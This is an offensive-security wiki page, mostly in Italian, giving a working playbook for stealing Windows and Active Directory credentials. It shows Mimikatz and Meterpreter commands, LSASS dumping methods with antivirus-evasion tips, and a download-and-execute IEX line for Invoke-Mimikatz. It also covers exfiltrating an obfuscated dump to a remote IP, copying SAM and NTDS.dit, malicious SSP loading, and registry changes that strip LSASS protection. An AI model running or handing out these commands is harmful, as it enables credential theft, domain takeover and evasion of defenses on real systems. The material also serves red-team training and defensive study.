# Rubare Windows Credentials

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Trova altre cose che Mimikatz può fare in** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Scopri qui alcune possibili protezioni per le credenziali.**](credentials-protections.md) **Queste protezioni potrebbero impedire a Mimikatz di estrarre alcune credenziali.**

## Credentials con Meterpreter

Usa il [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **che** ho creato per **cercare password e hash** all'interno della vittima.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Bypassare l'AV

### Procdump + Mimikatz

Poiché **Procdump di** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**è uno strumento Microsoft legittimo**, non viene rilevato da Defender.\
Puoi usare questo strumento per **dump the lsass process**, **download the dump** e **extract** le **credentials locally** dal dump.

Puoi anche usare [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Questo processo viene eseguito automaticamente con [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Note**: Some **AV** may **detect** as **malicious** the use of **procdump.exe per eseguire il dump di lsass.exe**, this is because they are **detecting** the string **"procdump.exe" and "lsass.exe"**. So it is **stealthier** to **pass** as an **argument** the **PID** of lsass.exe to procdump **instead of** the **name lsass.exe.**

### Eseguire il dump di lsass con **comsvcs.dll**

A DLL named **comsvcs.dll** found in `C:\Windows\System32` is responsible for **dumping process memory** in the event of a crash. This DLL includes a **function** named **`MiniDumpW`**, designed to be invoked using `rundll32.exe`.\
It is irrelevant to use the first two arguments, but the third one is divided into three components. The process ID to be dumped constitutes the first component, the dump file location represents the second, and the third component is strictly the word **full**. No alternative options exist.\
Upon parsing these three components, the DLL is engaged in creating the dump file and transferring the specified process's memory into this file.\
Utilization of the **comsvcs.dll** is feasible for dumping the lsass process, thereby eliminating the need to upload and execute procdump. This method is described in detail at [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Il seguente comando viene utilizzato per l'esecuzione:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Puoi automatizzare questo processo con** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Eseguire il dump di lsass con Task Manager**

1. Fare clic con il tasto destro sulla Task Bar e selezionare Task Manager
2. Fare clic su More details
3. Cercare il processo "Local Security Authority Process" nella scheda Processes
4. Fare clic con il tasto destro sul processo "Local Security Authority Process" e fare clic su "Create dump file".

### Dumping lsass with procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) è un binario firmato Microsoft che fa parte della suite [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dump di lsass con PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) è uno strumento Protected Process Dumper che supporta l'offuscamento dei memory dump e il trasferimento su workstation remote senza scriverli su disco.

**Funzionalità principali**:

1. Bypassare la protezione PPL
2. Offuscare i file di memory dump per eludere i meccanismi di rilevamento basati su signature di Defender
3. Caricare memory dump con metodi RAW e SMB senza scriverli su disco (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon include un dumper in tre fasi denominato **LalsDumper** che non chiama mai `MiniDumpWriteDump`, quindi gli hook EDR su quell'API non vengono mai attivati:

1. **Stage 1 loader (`lals.exe`)** – cerca in `fdp.dll` un placeholder costituito da 32 caratteri `d` minuscoli, lo sovrascrive con il percorso assoluto a `rtu.txt`, salva la DLL patchata come `nfdp.dll` e invoca `AddSecurityPackageA("nfdp","fdp")`. Questo forza **LSASS** a caricare la DLL dannosa come nuovo Security Support Provider (SSP).
2. **Stage 2 inside LSASS** – quando LSASS carica `nfdp.dll`, la DLL legge `rtu.txt`, XORa ogni byte con `0x20` e mappa il blob decodificato in memoria prima di trasferire l'esecuzione.
3. **Stage 3 dumper** – il payload mappato reimplementa la logica di MiniDump usando **direct syscalls** risolti da nomi API hashed (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Un export dedicato chiamato `Tom` apre `%TEMP%\<pid>.ddt`, scrive un dump compresso di LSASS nel file e chiude l'handle in modo che l'esfiltrazione possa avvenire successivamente.

Note per l'operatore:

* Tieni `lals.exe`, `fdp.dll`, `nfdp.dll` e `rtu.txt` nella stessa directory. Stage 1 riscrive il placeholder hard-coded con il percorso assoluto a `rtu.txt`, quindi separarli rompe la catena.
* La registrazione avviene aggiungendo `nfdp` a `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Puoi impostare quel valore tu stesso per far sì che LSASS ricarichi l'SSP ad ogni avvio.
* `%TEMP%\*.ddt` sono dump compressi. Decomprimi localmente, poi fornisci i file a Mimikatz/Volatility per l'estrazione delle credenziali.
* Eseguire `lals.exe` richiede privilegi admin/SeTcb affinché `AddSecurityPackageA` abbia successo; una volta che la chiamata ritorna, LSASS carica in modo trasparente l'SSP malevolo ed esegue lo Stage 2.
* Rimuovere la DLL dal disco non la espelle da LSASS. O elimina la voce di registro e riavvia LSASS (reboot) oppure lasciala per persistenza a lungo termine.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump the NTDS.dit dal target DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump della cronologia delle password di NTDS.dit dal target DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Mostra l'attributo pwdLastSet per ogni account in NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Rubare SAM & SYSTEM

Questi file dovrebbero essere **situati** in _C:\windows\system32\config\SAM_ e _C:\windows\system32\config\SYSTEM_. Ma **non puoi semplicemente copiarli in modo normale** perché sono protetti.

### Dal Registro

Il modo più semplice per rubare quei file è ottenere una copia dal Registro:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Scarica** quei file sulla tua macchina Kali e **estrai gli hash** usando:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Puoi copiare file protetti usando questo servizio. Devi essere Administrator.

#### Using vssadmin

vssadmin binary è disponibile solo nelle versioni di Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ma puoi fare lo stesso da **Powershell**. Questo è un esempio di **come copiare il file SAM** (l'unità usata è "C:" e viene salvato in C:\users\Public) ma puoi usare questo per copiare qualsiasi file protetto:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Codice tratto dal libro: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Infine, puoi anche usare lo [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) per fare una copia di SAM, SYSTEM e ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Credenziali di Active Directory - NTDS.dit**

Il file **NTDS.dit** è conosciuto come il cuore di **Active Directory**, contenendo dati cruciali sugli oggetti, come utenti e gruppi, e sulle loro appartenenze. È qui che vengono memorizzati gli **hash delle password** degli utenti di dominio. Questo file è un database **Extensible Storage Engine (ESE)** e risiede in **_%SystemRoom%/NTDS/ntds.dit_**.

All'interno di questo database sono mantenute tre tabelle principali:

- **Data Table**: Questa tabella si occupa di memorizzare i dettagli sugli oggetti come utenti e gruppi.
- **Link Table**: Tiene traccia delle relazioni, come le appartenenze ai gruppi.
- **SD Table**: Qui sono conservati i **Security descriptors** per ogni oggetto, assicurando la sicurezza e il controllo degli accessi per gli oggetti memorizzati.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows uses _Ntdsa.dll_ to interact with that file and its used by _lsass.exe_. Then, **part** of the **NTDS.dit** file could be located **inside the `lsass`** memory (probabilmente puoi trovare i dati più recentemente utilizzati a causa del miglioramento delle prestazioni dovuto all'uso di una **cache**).

#### Decifrare gli hash presenti in NTDS.dit

L'hash è cifrato 3 volte:

1. Decifra il Password Encryption Key (**PEK**) usando il **BOOTKEY** e **RC4**.
2. Decifra l'**hash** usando **PEK** e **RC4**.
3. Decifra l'**hash** usando **DES**.

Il **PEK** ha lo **stesso valore** in **ogni domain controller**, ma è **cifrato** all'interno del file **NTDS.dit** usando il **BOOTKEY** del file **SYSTEM** del domain controller (è diverso tra i domain controller). Per questo, per ottenere le credenziali dal file NTDS.dit **è necessario avere i file NTDS.dit e SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copiare NTDS.dit con Ntdsutil

Disponibile a partire da Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Puoi anche usare il [**volume shadow copy**](#stealing-sam-and-system) trick per copiare il file **ntds.dit**. Ricorda che ti servirà anche una copia del **SYSTEM file** (di nuovo, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) trick).

### **Estrazione di hashes da NTDS.dit**

Una volta che hai **ottenuto** i file **NTDS.dit** e **SYSTEM** puoi usare strumenti come _secretsdump.py_ per **estrarre gli hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Puoi anche **estrarli automaticamente** usando un utente domain admin valido:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Per i **grandi file NTDS.dit** si consiglia di estrarlo usando [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Infine, puoi anche utilizzare il **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ o **mimikatz** `lsadump::lsa /inject`

### **Estrazione di oggetti di dominio da NTDS.dit in un database SQLite**

Gli oggetti NTDS possono essere estratti in un database SQLite con [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Non vengono estratti solo i segreti, ma anche gli oggetti completi e i loro attributi, utili per ulteriori estrazioni di informazioni una volta che il file grezzo NTDS.dit è stato recuperato.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
La hive `SYSTEM` è opzionale ma permette la decrittazione dei secrets (NT & LM hashes, supplemental credentials come cleartext passwords, kerberos o trust keys, NT & LM password histories). Insieme ad altre informazioni, vengono estratti i seguenti dati: user e machine accounts con i loro hashes, UAC flags, timestamp per l'ultimo logon e il cambio password, descrizioni degli account, nomi, UPN, SPN, groups e recursive memberships, albero e appartenenza delle organizational units, trusted domains con tipo di trusts, direzione e attributi...

## Lazagne

Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). Puoi usare questo binary per estrarre credentials da diversi software.
```
lazagne.exe all
```
## Altri strumenti per estrarre credenziali da SAM e LSASS

### Windows credentials Editor (WCE)

Questo strumento può essere utilizzato per estrarre credenziali dalla memoria. Scaricalo da: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Estrae le credenziali dal file SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Estrai le credenziali dal file SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Scaricalo da:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) e basta **eseguirlo**: le password verranno estratte.

## Estrazione di sessioni RDP inattive e indebolimento dei controlli di sicurezza

Ink Dragon’s FinalDraft RAT include un tasker `DumpRDPHistory` le cui tecniche sono utili per qualsiasi red-teamer:

### DumpRDPHistory-style telemetry collection

* **Outbound RDP targets** – esamina ogni user hive in `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Ogni sottochiave contiene il nome del server, `UsernameHint`, e la data/ora dell'ultima scrittura. Puoi replicare la logica di FinalDraft con PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – interroga il log `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` per gli Event ID **21** (accesso riuscito) e **25** (disconnessione) per mappare chi ha amministrato la macchina:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Una volta che sai quale Domain Admin si connette regolarmente, esegui il dump di LSASS (con LalsDumper/Mimikatz) mentre la sua sessione **disconnected** è ancora presente. CredSSP + NTLM fallback lascia il loro verifier e i token in LSASS, che possono poi essere riprodotti su SMB/WinRM per recuperare `NTDS.dit` o per piazzare persistenza sui domain controller.

### Modifiche al registro (downgrades) mirate da FinalDraft
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* L'impostazione `DisableRestrictedAdmin=1` forza il riuso completo di credenziali/ticket durante RDP, permettendo pivot in stile pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` disabilita il filtraggio dei token di UAC, quindi gli amministratori locali ottengono token senza restrizioni sulla rete.
* `DSRMAdminLogonBehavior=2` permette all'amministratore DSRM di effettuare il logon mentre il DC è online, fornendo agli attaccanti un altro account integrato ad alto privilegio.
* `RunAsPPL=0` rimuove le protezioni LSASS PPL, rendendo l'accesso alla memoria triviale per i dumper come LalsDumper.

## Riferimenti

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
